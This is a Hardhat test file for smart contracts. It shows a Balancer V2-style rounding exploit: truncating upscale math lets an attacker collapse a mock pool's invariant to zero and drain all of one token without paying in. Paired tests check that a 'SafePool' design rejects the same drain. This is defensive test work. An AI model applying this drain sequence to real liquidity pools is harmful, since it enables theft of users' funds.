import { expect } from "chai";
import { network } from "hardhat";

const { ethers } = await network.connect();

describe("Balancer V2 rounding exploit vs MMPPair", function () {
  async function deploy() {
    const [owner, attacker] = await ethers.getSigners();

    // token0: 6-decimal (USDC-like) — raw units, 1 USDC = 1e6
    // token1: 18-decimal (wETH-like) — 1 ETH = 1e18
    const t0 = await ethers.deployContract("MockERC20", [10_000n * 1_000_000n]);
    const t1 = await ethers.deployContract("MockERC20", [ethers.parseEther("100")]);

    const vuln = await ethers.deployContract("VulnerablePool", [
      await t0.getAddress(),
      await t1.getAddress(),
    ]);
    const safe = await ethers.deployContract("SafePool", [
      await t0.getAddress(),
      await t1.getAddress(),
    ]);

    // seed both pools: 1000 USDC (= 1e9 raw), 1 ETH (= 1e18)
    const R0 = 1_000n * 1_000_000n;
    const R1 = ethers.parseEther("1");

    await t0.approve(await vuln.getAddress(), R0);
    await t1.approve(await vuln.getAddress(), R1);
    await vuln.addLiquidity(R0, R1);

    await t0.approve(await safe.getAddress(), R0);
    await t1.approve(await safe.getAddress(), R1);
    await safe.addLiquidity(R0, R1);

    await t0.mint(attacker.address, 1_000_000n);

    return { vuln, safe, t0, t1, owner, attacker, R0, R1 };
  }

  // --- mulDown rounding ---

  it("mulDown: any amount < 1e6 upscales to 0", async function () {
    const { vuln } = await deploy();
    expect(await vuln.upscale(0n)).to.equal(0n);
    expect(await vuln.upscale(999_999n)).to.equal(0n); // 999999 / 1e6 = 0
    expect(await vuln.upscale(1_000_000n)).to.equal(1n); // exactly 1 USDC
  });

  it("mulDown: 65 accumulations each lose 1 unit of upscaled value", async function () {
    const { vuln } = await deploy();
    // each step: amount = 1.5 USDC-units (1_500_000 raw) upscales to 1, not 2
    // the 0.5-unit rounding loss is the accumulation mechanism
    const step = 1_500_000n;
    let accumulated = 0n;
    for (let i = 0; i < 65; i++) {
      const upscaled = await vuln.upscale(step);
      accumulated += 2n - upscaled; // expected=2, actual=1, loss=1 per iteration
    }
    expect(accumulated).to.equal(65n); // 65 rounding losses
  });

  // --- VulnerablePool exploit ---

  it("vulnerable: after BPT redemption to rounding boundary, k collapses to 0", async function () {
    const { vuln, R1 } = await deploy();

    // Initial invariant: upscale(1e9) * 1e18 = 1000 * 1e18
    const kBefore = await vuln.k();
    expect(kBefore).to.equal(1000n * R1);

    // BPT redemption drives reserve0 to 9 (< 1e6)
    await vuln.redeemBPT(9n);

    // upscale(9) = 0 → k collapses
    expect(await vuln.k()).to.equal(0n);
    expect(await vuln.upscale(9n)).to.equal(0n);
  });

  it("vulnerable: after k=0, attacker drains all token1 with 0 token0", async function () {
    const { vuln, t0, t1, attacker, R1 } = await deploy();

    const vulnAddr = await vuln.getAddress();

    // push reserve0 to rounding boundary
    await vuln.redeemBPT(9n);
    expect(await vuln.k()).to.equal(0n);

    const attackerT1Before = await t1.balanceOf(attacker.address);

    // attacker sends 0 token0, extracts all token1
    // invariantOf(9 + 0, R1 - R1) = upscale(9) * 0 = 0 >= 0 = k  ✓ passes!
    await t0.connect(attacker).approve(vulnAddr, 0n);
    await vuln.connect(attacker).swap(0n, R1 - 1n); // drain all but 1 wei

    const attackerT1After = await t1.balanceOf(attacker.address);
    expect(attackerT1After - attackerT1Before).to.equal(R1 - 1n);
    expect(await vuln.reserve1()).to.equal(1n); // pool drained
  });

  // --- MMPPair: no division, invariant holds ---

  it("safe: invariant is exact at rounding boundary — k never collapses", async function () {
    const { safe, R0, R1 } = await deploy();

    // k = R0 * R1 (exact natural number product, no division)
    expect(await safe.k()).to.equal(R0 * R1);

    // BoxMath.evaluatePolynumber at reserve0=9 returns 9 * R1 — never 0
    const bm = await ethers.deployContract("BoxMath");
    const xy = { coefficient: 1n, exponents: [1n, 1n] };
    expect(await bm.evaluatePolynumber(xy, [9n, R1])).to.equal(9n * R1);
  });

  it("safe: same drain attempt fails — invariant check catches it", async function () {
    const { safe, t0, attacker, R1 } = await deploy();

    const safeAddr = await safe.getAddress();

    // zero input guard fires first
    await t0.connect(attacker).approve(safeAddr, 0n);
    await expect(
      safe.connect(attacker).swap(0n, R1 - 1n)
    ).to.be.revertedWith("zero input");

    // 1 wei in cannot justify extracting R1-1 out
    await t0.connect(attacker).approve(safeAddr, 1n);
    await expect(
      safe.connect(attacker).swap(1n, R1 - 1n)
    ).to.be.revertedWith("invariant violated");
  });
});
